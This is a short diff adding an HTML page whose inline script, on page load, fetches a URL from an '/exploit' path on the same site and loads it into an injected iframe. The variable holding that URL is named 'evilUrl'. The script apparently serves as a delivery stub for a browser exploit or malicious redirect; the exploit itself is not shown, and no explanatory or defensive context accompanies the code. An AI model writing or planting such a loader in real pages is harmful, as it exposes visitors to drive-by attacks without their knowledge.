@@ -1,0 +1,10 @@
+<body>
+    <script>
+        (async () => {
+            const evilUrl = await fetch("/exploit").then(r => r.text());
+            const iframe = document.createElement("iframe");
+            iframe.src = evilUrl;
+            document.body.appendChild(iframe);
+        })();
+    </script>
+</body>
